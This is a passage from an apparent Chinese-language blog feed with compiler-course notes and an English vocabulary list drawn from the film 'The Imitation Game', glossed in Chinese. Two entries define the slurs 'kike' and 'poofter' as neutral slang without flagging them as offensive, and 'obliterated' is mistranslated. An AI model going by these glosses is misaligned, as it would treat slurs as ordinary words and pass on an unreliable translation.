GitHub 上越來越多 emoji 了XDD  &lt;/p&gt;</summary><category term="Thought"></category><category term="Git"></category><category term="GitHub"></category><category term="Speech"></category></entry><entry><title>Compiler Design Week 4</title><link href="https://blog.m157q.tw/posts/2015/03/19/compiler-design-week-4/" rel="alternate"></link><published>2015-03-19T15:45:20+08:00</published><updated>2015-03-19T15:45:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-19:posts/2015/03/19/compiler-design-week-4/</id><summary type="html">&lt;h1&gt;2015/03/17&lt;/h1&gt;
&lt;p&gt;HW1 Released.&lt;br /&gt;
see &lt;a href="https://github.com/M157q/Compiler_NTHU_hw1"&gt;https://github.com/M157q/Compiler_NTHU_hw1&lt;/a&gt;&lt;br /&gt;
清大的作業真的比交大簡單很多&lt;br /&gt;
scanner 竟然只要滿足一個測資...  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;2015/03/19&lt;/h1&gt;
&lt;p&gt;繼續講 DFA, NFA  &lt;/p&gt;
&lt;h2&gt;NFA&lt;/h2&gt;
&lt;p&gt;ε =&amp;gt; empty string  &lt;/p&gt;
&lt;h2&gt;Regex 轉 NFA&lt;/h2&gt;
&lt;h2&gt;NFA (without empty string move) 轉 DFA&lt;/h2&gt;</summary><category term="Course"></category><category term="Compiler"></category></entry><entry><title>Vocabulary of The Imitation Game</title><link href="https://blog.m157q.tw/posts/2015/03/18/vocabulary-of-the-imitation-game/" rel="alternate"></link><published>2015-10-27T12:39:00+08:00</published><updated>2015-10-27T12:39:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-18:posts/2015/03/18/vocabulary-of-the-imitation-game/</id><summary type="html">&lt;h1&gt;Intro&lt;/h1&gt;
&lt;p&gt;電影 "The Imitation Game"，中譯為《模仿遊戲》。&lt;br /&gt;
一部根據事實改編，描述計算機科學之父 Alan Turing 在二戰時，&lt;br /&gt;
協助盟軍破解德軍的 Enigma 密碼系統及其同性戀生平的電影。&lt;br /&gt;
身為一個資工阿宅，當然要看一下這位資工領域巨擘的傳記電影。  &lt;/p&gt;
&lt;h1&gt;Note&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Alan_Turing"&gt;Alan Turing - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Turing_machine"&gt;Turing machine - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;"Sometimes it's the very people who no one imagines anything of who do the things that no one can imagine."  &lt;ul&gt;
&lt;li&gt;有時候，正是一個無法讓人預料到的人，能做出讓人無法預料到的事。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://weibo.com/2962500997/C2lr7bbYU?from=page_1005052962500997_profile&amp;amp;wvr=6&amp;amp;mod=weibotime#_rnd1426615110908"&gt;有时候，正是无人所念之人，方能成无人敢想之事。&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Stewart_Menzies"&gt;Stewart Menzies - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Conel_Hugh_O%27Donel_Alexander"&gt;Conel Hugh O'Donel Alexander - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Joan_Clarke"&gt;Joan Clarke - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/I._J._Good"&gt;I. J. Good - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Beale_ciphers"&gt;Beale ciphers - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Enigma_machine"&gt;Enigma machine - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Vocabulary&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;undiluted  
KK[͵ʌndɪˋljutɪd] DJ[ˋʌndaiˋlju:tid]  
a.形容詞  
  1. 未稀釋的  
  2. （感情等）純真的，沒攙雜的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cyanide  
KK[ˋsaɪə͵naɪd] DJ[ˋsaiənaid]  
n.名詞  
  1. 【化】氰化物  
vt.及物動詞  
  1. 用氰化物處理；用氰化物處理以提取金銀  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;thimbleful  
KK[ˋθɪmb!͵fʊl] DJ[ˋθimblful]  
n.名詞  
  1. （酒等的）極少量  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ruckus  
KK[ˋrʌkəs] DJ[ˋrʌkəs]  
n.名詞  
  1. 【美】【口】喧鬧；騷動  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spat  
n名詞  
  1. [C] informal -a short unimportant quarrel 【非正式】口角﹐小爭吵  
    It&amp;#39;s just your normal, average sibling spat.  
    那只是你們兄弟間正常的小吵吵而已。  
  2. [plural] special pieces of cloth worn in former times by men above their shoes and fastened with buttons 〔舊時男子穿的〕鞋罩﹐鞋套  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apron  
KK[ˋeprən] DJ[ˋeiprən]  
n.[C]可數名詞  
  1. 圍裙；工作裙  
    A maid in a white apron opened the door.  
    一個身著白圍裙的女佣開了門。  
  2. 停機坪  
    He drove straight to the apron where the plane was waiting.  
    他驅車直奔停機坪，那兒飛機正等待起飛。  
  3. 臺口（指舞臺幕布前的部分）  
  4. 【建】遮簷板；窗臺  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;quid  
KK[kwɪd] DJ[kwid]  
n.名詞  
  1. 【英】【俚】一鎊金幣；（複數）錢  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;insufferable  
KK[ɪnˋsʌfərəb!] DJ[inˋsʌfərəbl]  
a.形容詞  
  1. 不可忍受的  
  2. 氣人的；討厭的  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="http://www.urbandictionary.com/define.php?term=SOD"&gt;Urban Dictionary: SOD&lt;/a&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sod  
Brithish slang term meaning bastard  
Aw buggger off you corney SOD  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;還有很多其他很糟糕的意思... - -""  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;undertaking  
KK[͵ʌndɚˋtekɪŋ] DJ[͵ʌndəˋteikiŋ]  
n.名詞  
  1. 事業；企業；工作[C][S1]  
    It seemed an endless undertaking.  
    那件事辦起來像沒個完似的。  
  2. 保證；許諾[C][+to-v][+that]  
    give an undertaking not to take sides  
    保證不偏袒任何一方  
  3. 喪葬事宜；殯儀業[U]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mathematician  
KK[͵mæθəməˋtɪʃən] DJ[͵mæθiməˋtiʃən]  
n.名詞  
  1. 數學家[C]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;prodigy  
KK[ˋprɑdədʒɪ] DJ[ˋprɔdidʒi]  
n.[C]可數名詞  
  1. 奇蹟，奇事；奇觀  
  2. 奇才，天才  
    a child prodigy  
    神童  
  3. 【古】預兆  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;par  
KK[pɑr] DJ[pɑ:]  
n.名詞  
  1. 同等，同價，同位[S]  
    The gains and losses are about on a par.  
    得失幾乎相當。  
  2. 平均，標準[U]  
  3. （健康等的）常態[U]  
    Most athletes are above par in physical conditions.  
    大多數運動員的體質在一般水平以上。  
  4. 平價；票面價值[U]  
    Your shares are at par.  
    你的股金與票面價值相等。  
  5. （高爾夫球中的）標準杆數[C]  
a.形容詞  
  1. 與票面價值相等的，平價的  
  2. 常態的，平均的，一般標準的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pacifist  
KK[ˋpæsəfɪst] DJ[ˋpæsifist]  
n.名詞  
  1. 和平主義者  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;agnostic  
KK[ægˋnɑstɪk] DJ[ægˋnɔstik]  
a.形容詞  
  1. 【哲】不可知論的  
n.名詞  
  1. 【哲】不可知論者  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;who wants to engulf Europe in tyranny.  

engulf  
KK[ɪnˋgʌlf] DJ[inˋgʌlf]  
vt.及物動詞  
  1. 吞沒；捲入  
    The house was engulfed in flames.  
    這房子被火苗吞噬了。  

tyranny  
KK[ˋtɪrənɪ] DJ[ˋtirəni]  
n.名詞  
  1. 暴政；專制[U]  
    A tyrant will always find a pretext for his tyranny.  
    暴君總可以為自己找到暴政的藉口。  
  2. 暴虐，專橫[U]  
    The organization helps victims of domestic tyranny.  
    這個組織幫助那些家庭暴虐的受害者。  
  3. 苛刻，嚴酷[U]  
  4. 殘暴專橫的行為[P]  
    His diary recorded the tyrannies of the invaders.  
    他的日記記載下了侵略者的殘酷暴行。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;convoy  
KK[ˋkɑnvɔɪ] DJ[ˋkɔnvɔi]  
n.名詞  
  1. 護航；護送；護衛[U]  
  2. 護航（或護衛）艦隊；護送部隊[C][G]  
    form a convoy  
    組成護航艦隊  
  3. 受護送的船隊（或車隊等）；（互相護送的）同行船隊（或車隊等）[C][G]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gibberish  
KK[ˋdʒɪbərɪʃ] DJ[ˋgibəriʃ]  
n.名詞  
  1. 胡言亂語；無意義的聲音  
  2. 亂碼  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;famished  
KK[ˋfæmɪʃt] DJ[ˋfæmiʃt]  
a.形容詞  
  1. 非常飢餓的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;irascible  
KK[ɪˋræsəb!] DJ[iˋræsibl]  
a.形容詞  
  1. 易怒的；暴躁的  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;you are a small cog in a large system.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cog  
KK[kɑg] DJ[kɔg]  
n.名詞  
  1. 【機】鈍齒  
  2. 雄榫  
vt.及物動詞  
  1. 給……裝配齒輪  
  2. 以雄榫連接  
vi.不及物動詞  
  1. 以雄榫連接  
  2. 吻合，一致  
  3. 擲骰子時作弊；詐騙  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mediocre  
KK[ˋmidɪ͵okɚ] DJ[ˋmi:diəukə]  
a.形容詞  
  1. 中等的；平凡的；二流的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;kike  
KK[kaɪk] DJ[kaik]  
n.名詞  
  1. 【俚】猶太人  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;humdrum  
KK[ˋhʌm͵drʌm] DJ[ˋhʌmdrʌm]  
a.形容詞  
  1. 平凡的  
    Their life consisted of the humdrum activities of everyday existence.  
    他們的生活由日常生存的平凡活動所構成。  
  2. 單調的；無聊的  
    The accountant said it was the most humdrum day that she had ever passed.  
    會計師說這是她所度過的最無聊的一天。  
n.名詞  
  1. 平凡  
    They might marry, and sink to the humdrum of other old married people.  
    他們可能結婚，然後陷於像那些老年夫妻一樣的平凡。  
  2. 單調；無聊  
    Don&amp;#39;t do anything stupid because of the humdrum.  
    不要因為無聊而幹蠢事。  
vi.不及物動詞  
  1. 單調乏味地進行  
    The work humdrumed on for days.  
    這工作單調乏味地進行了好幾天。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;indecorous  
KK[ɪnˋdɛkərəs] DJ[inˋdekərəs]  
a.形容詞  
  1. 無禮的；不合禮節的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;clerical  
KK[ˋklɛrɪk!] DJ[ˋklerikəl]  
a.形容詞  
  1. 神職（人員）的，牧師的  
    I supposed that the ministers would sanction my clerical efforts, but they didn&amp;#39;t.  
    我想牧師們會支持我的神職工作，可是他們卻沒有。  
  2. 辦事員的；書記的  
    We need someone to do the clerical work here.  
    我們這裡需要一個人做辦事員的工作。  
  3. 【貶】支持教權主義的  
    She threw away the clerical pamphlet passed out to her by someone on the street.  
    她扔掉了有人在街上遞給她的有關支持教權主義的小冊子。  
n.[C]可數名詞  
  1. 神職人員；牧師；教士  
    The man looked like a clerical.  
    這人看起來像個牧師。  
  2. （亦可大寫）教權主義支持者  
    This is the place where the clericals have their meetings.  
    這裡是教權主義支持者們開會的地方。  
  3. 教士服[P]  
    I looked up at the gentleman in the clericals.  
    我抬頭看著這位身穿教士服的先生。  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;manila envelope  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;manila  
KK[məˋnɪlə] DJ[məˋnilə]  
n.名詞  
  1. 馬尼拉麻；馬尼拉紙  
a.形容詞  
  1. 馬尼拉麻製的；馬尼拉紙製的  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;chimes of the midnight  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;chime  
KK[tʃaɪm] DJ[tʃaim]  
n.名詞  
  1. （有音階的）樂鐘，音樂門鈴[P]  
  2. （時鐘的）報時裝置；（排鐘等的）敲鐘裝置[C]  
  3. 管鐘，排鐘[P]  
  4. （有音階的）鐘聲，鐘樂[P]  
  5. 和諧，一致  
vi.不及物動詞  
  1. （鐘）鳴，鳴響  
    The church bells chimed.  
    教堂的鐘響了。  
  2. 和諧，一致[（+with）]  
    Her views on this chimed with mine.  
    她對這個問題的看法與我一致。  
vt.及物動詞  
  1. 和諧悅耳地奏出（音樂等）  
  2. 用鐘聲報（時）  
    The clock chimed one o&amp;#39;clock.  
    鐘敲一點。  
  3. 敲鐘召集（或驅趕）  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rotor  
KK[ˋrotɚ] DJ[ˋrəutə]  
n.名詞  
  1. 【電】【機】轉子；轉片；旋轉輪；旋轉翼  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;precocious  
KK[prɪˋkoʃəs] DJ[priˋkəuʃəs]  
a.形容詞  
  1. 早熟的，早成的  
    Her precocious mathematical ability astounded her parents.  
    她那早慧的數學能力令她的父母非常吃驚。  
  2. 過早成熟的，過早發育的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;foam  
KK[fom] DJ[fəum]  
n.[U]不可數名詞  
  1. 泡沫；滅火泡沫  
    The surface of the water is full of foam.  
    水面都是泡沫。  
  2. （馬等的）大汗  
  3. 泡沫材料；泡沫橡皮；泡沫塑料  
vi.不及物動詞  
  1. 起泡沫；（馬等）冒汗  
    The icy cold water foamed over the side of the boat.  
    冰涼的水在船邊泛起泡沫。  
  2. 吐白沫；（發怒時）唾沫四濺  
  3. 【口】大怒[（+with）]  
    He foamed with anger when he found out his son had lied.  
    他發現兒子撒了謊便勃然大怒。  
  4. 起著泡沫流動  
vt.及物動詞  
  1. 使起泡沫；使成泡沫狀物  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;irrational  
KK[ɪˋræʃən!] DJ[iˋræʃənəl]  
a.形容詞  
  1. 無理性的  
    Animals are irrational creatures.  
    野獸是沒有理性的動物。  
  2. 不合理的；不明事理的；荒謬的  
    He had an irrational belief that everybody was his enemy.  
    他有個荒謬的信念，以為人人都是他的仇敵。  
  3. 【數】無理的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;escort  
KK[ˋɛskɔrt] DJ[ˋeskɔ:t]  
n.名詞  
  1. 護衛隊；護航隊；護航艦；護航飛機；儀隊[C][G]  
    The queen&amp;#39;s escort totaled fifty men.  
    女王的警衛隊共有五十名。  
  2. 護衛者，護送者[C]  
  3. 陪伴女性赴宴會（或舞會等）的男士[C]  
  4. 護衛，護送；護航；陪同[U]  
    The prisoners were taken to another jail under escort.  
    囚犯們被護送到另一個監獄。  
vt.及物動詞  
  1. 護送；為……護航；陪同[（+to）]  
    I&amp;#39;m going to escort her home.  
    我打算護送她回家。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;premises  
KK[ˋprɛmɪsɪz] DJ[ˋpremisiz]  
n.名詞  
  1. 房宅（或辦公室）連全部建築及地基；生產場所，經營場址  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;bloke  
KK[blok] DJ[bləuk]  
n.名詞  
  1. 【英】【俚】小子；傢伙  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;poofter  
KK[ˋpuftɚ] DJ[ˋpu:ftə]  
n.名詞  
  1. 【英】同性戀男子  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;indecency  
KK[ɪnˋdisnsɪ] DJ[inˋdi:snsi]  
n.名詞  
  1. 無禮  
  2. 猥褻；卑劣  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;interrogate  
KK[ɪnˋtɛrə͵get] DJ[inˋterəgeit]  
vt.及物動詞  
  1. 審問；質問  
vi.不及物動詞  
  1. 審問；質問  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;errand  
KK[ˋɛrənd] DJ[ˋerənd]  
n.[C]可數名詞  
  1. 差事，差使  
    I&amp;#39;ve no time to run errands for you.  
    我沒有時間為你跑腿。  
  2. 任務，使命  
    How many errands did you do in the trip?  
    你這次出行完成幾項任務？  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;narcissist  
KK[nɑrˋsɪsɪst] DJ[nɑ:ˋsisist]  
n.名詞  
  1. 自我陶醉者  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;clamp  
KK[klæmp] DJ[klæmp]  
n.名詞  
  1. 螺絲鉗，鐵箍，夾鉗[C]  
vt.及物動詞  
  1. 鉗緊；夾住[O]  
    Clamp these two pieces of wood together.  
    把兩根木頭鉗緊。  
  2. 【美】強行實施；強加[（+down on）]  
    clamp a curfew on the town  
    對該城鎮強制實行宵禁  
vi.不及物動詞  
  1. 【美】強行壓制（或限制），取締[+down on]  
    They clamp down on pickpockets.  
    他們嚴禁扒竊。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;humming  
KK[ˋhʌmɪŋ] DJ[ˋhʌmiŋ]  
a.形容詞  
  1. 發嗡嗡聲的；哼著唱的  
n.名詞  
  1. 哼唱  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Marseillaise  
KK[͵mɑrs!ˋez] DJ[͵mɑ:səˋleiz]  
n.名詞  
  1. 【法】馬賽曲（法國國歌）  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;divergence  
KK[daɪˋvɝdʒəns] DJ[daiˋvə:dʒəns]  
n.名詞  
  1. 分歧  
  2. 背離；分離；相異  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pollen  
KK[ˋpɑlən] DJ[ˋpɔlin]  
n.名詞  
  1. 【植】花粉[U]  
vt.及物動詞  
  1. 給……傳授花粉  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pint  
KK[paɪnt] DJ[paint]  
n.名詞  
  1. 品脫（英美容量或液量名，等於二分之一夸脫）  
  2. （啤酒等的）一品脫的量[（+of）]  
    He drank two pints of beer.  
    他喝了兩品脫的啤酒。  
  3. 一品脫的容器  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sloe gin  
ph.片語  
  1. 野莓紅琴酒  

sloe  
KK[slo] DJ[sləu]  
n.名詞  
  1. 黑刺李  
  2. 黑刺李果實  

gin  
KK[dʒɪn] DJ[dʒin]  
n.[U][C]  
  1. 杜松子酒  
    Gin is usually drunk with tonic water or fruit juice.  
    杜松子酒通常與碳酸奎寧水或果汁一起喝。  
  2. 【俚】酒類  
vi.不及物動詞  
  1. 喝杜松子酒；喝酒  
  2. 喝醉[（+up）]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Carlisle  
KK[kɑrˋlaɪl] DJ[kɑ:ˋlail]  
n.名詞  
  1. 喀來耳（英格蘭一郡及其首府）  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;gunnery ensign  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gunnery  
KK[ˋgʌnərɪ] DJ[ˋgʌnəri]  
n.名詞  
  1. 砲術；射擊  
  2. （總稱）重砲  

ensign  
KK[ˋɛnsn] DJ[ˋensən]  
n.[C]可數名詞  
  1. 旗；軍旗  
    At that moment, from behind the short bushes, there appeared the artillery ensign.  
    此時從矮小的叢林後面出現了砲兵部隊的軍旗。  
  2. 【美】海軍少尉  
    Her elder brother was an ensign before his discharge.  
    她哥哥退伍前是海軍少尉。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;conspiracy  
KK[kənˋspɪrəsɪ] DJ[kənˋspirəsi]  
n.名詞  
  1. 陰謀；謀叛；共謀[C][U][+to-v]  
    crush a conspiracy to smuggle drugs into the country  
    粉碎偷運毒品入境的密謀  
  2. 陰謀集團[C]  
  3. 【古】合作；（湊巧的）同時發生[U]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;paranoid  
KK[ˋpærənɔɪd] DJ[ˋpærənɔid]  
a.形容詞  
  1. 屬於偏執狂的；顯示出偏執狂症狀的  
n.名詞  
  1. 偏執狂患者  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;solitary  
KK[ˋsɑlə͵tɛrɪ] DJ[ˋsɔlitəri]  
a.形容詞  
  1. 單獨的，獨自的[Z][B]  
    He formed the habit of taking long solitary walks through the streets.  
    他養成了在街頭長時間獨自漫步的習慣。  
  2. 單個的，唯一的[Z][B]  
  3. 隱居的；孤獨的；寂寞的  
  4. 荒涼的；偏僻的  
  5. 【動】非群居的[Z]  
  6. 【植】單生的[Z]  
n.名詞  
  1. 獨居者；隱士[C]  
  2. 單獨監禁[U]  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ardennes  

  1. A wooded plateau of northern France, southeast Belgium, and northern Luxembourg east and south of the Meuse River. It was the scene of heavy fighting in World War I and World War II, culminating in the Battle of the Bulge in December 1944 and January 1945.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;planes dropping bombs from the sky until they obliterated the sun itself.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;obliterated  

  1. 阻塞  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;solemn  
KK[ˋsɑləm] DJ[ˋsɔləm]  
a.形容詞  
  1. 嚴肅的；莊重的；莊嚴的  
    He was very solemn and refrained from talking.  
    他很嚴肅，沉默寡言。  
  2. 隆重的；鄭重的  
    He made a solemn promise to do better.  
    他鄭重保證要做得更好。  
  3. 嚴重的，嚴正的  
    The government made a solemn statement.  
    政府發表了一項嚴正的聲明。  
  4. 正式的；神聖的，宗教上的  
    The President took the solemn oath of office.  
    總統正式宣誓就職。  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;bovine tuberculosis  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;bovine  
KK[ˋbovaɪn] DJ[ˋbəuvain]  
a.形容詞  
  1. 牛的  
  2. 遲鈍的  
n.名詞  
  1. 牛科動物  

tuberculosis  
KK[tju͵bɝkjəˋlosɪs] DJ[tju:͵bə:kjuˋləusis]  
n.名詞  
  1. 【醫】結核病[U]  
    She contracted tuberculosis.  
    她染上了結核病。  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;chemical castration 化學閹割  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;castration  
KK[kæsˋtreʃən] DJ[kæsˋtreiʃən]  
n.名詞  
  1. 去勢；【植】去雄  
  2. 刪改  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;homosexual predilections  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;predilection  
KK[͵pridɪˋlɛkʃən] DJ[͵pri:diˋlekʃən]  
n.名詞  
  1. 嗜好；偏愛  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;inquiry  
KK[ɪnˋkwaɪrɪ] DJ[inˋkwaiəri]  
n.名詞  
  1. 詢問，打聽；質詢[C][U][（+about/into）]  
    Make your inquiries at the office.  
    請去辦公室詢問。  
  2. 調查[C][（+into）]  
    They held an inquiry into the incident.  
    他們對這一事件展開調查。  
  3. 探究，探索[U][C]  
    scientific inquiry  
    科學探索  
  4. 疑問；問題[C]  
    The bank clerk answered all my inquiries.  
    銀行職員回答了我提出的所有問題。  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;posthumous  
KK[ˋpɑstjuməs] DJ[ˋpɔstjuməs]  
a.形容詞  
  1. 死後的；死後出版的  
  2. 遺腹的  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;unprecedented  
KK[ʌnˋprɛsə͵dɛntɪd] DJ[ʌnˋpresidəntid]  
a.形容詞  
  1. 無先例的，空前的[Z]  
    The rate of growth was unprecedented.  
    這個成長率是前所未有的。  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;以下有雷&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Thoughts&lt;/h1&gt;
&lt;p&gt;整部電影分為兩個主線，&lt;br /&gt;
一個是破解 Enigma 的劇情，一個則是描述 Alan Turing 關於他同性戀的部分。&lt;br /&gt;
採取穿插的方式描述，最後融合在警探和 Alan Turing 之間的 Imitation Game 的問答。&lt;br /&gt;
其中的對話非常耐人尋味：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「只因為思考的方式不同，就能判斷是不是人嗎？」  &lt;/li&gt;
